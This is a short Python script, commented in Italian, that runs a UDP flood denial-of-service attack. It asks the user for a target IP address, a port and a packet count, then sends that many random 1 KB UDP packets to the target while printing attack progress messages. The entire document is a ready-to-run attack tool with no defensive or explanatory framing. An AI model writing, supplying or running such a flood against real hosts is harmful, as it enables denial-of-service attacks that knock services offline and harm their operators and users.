import socket
import random

# Funzione che invia pacchetti UDP
def udp_flood(target_ip, target_port, n_pacchetti):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random.randbytes(1024)  # Pacchetto di 1 KB

    print(f"Inizio attacco UDP flood verso {target_ip}:{target_port}")

    for i in range(n_pacchetti):
        client.sendto(packet, (target_ip, target_port))
        print(f"Pacchetto {i+1} inviato")

    client.close()
    print("Attacco completato.")

# Richiesta di inserire i dettagli del target
target_ip = input("Inserisci l'indirizzo IP della macchina target: ")
target_port = int(input("Inserisci la porta UDP della macchina target: "))
n_pacchetti = int(input("Inserisci il numero di pacchetti da 1KB da inviare: "))

# Avvio dell'attacco UDP flood
udp_flood(target_ip, target_port, n_pacchetti)


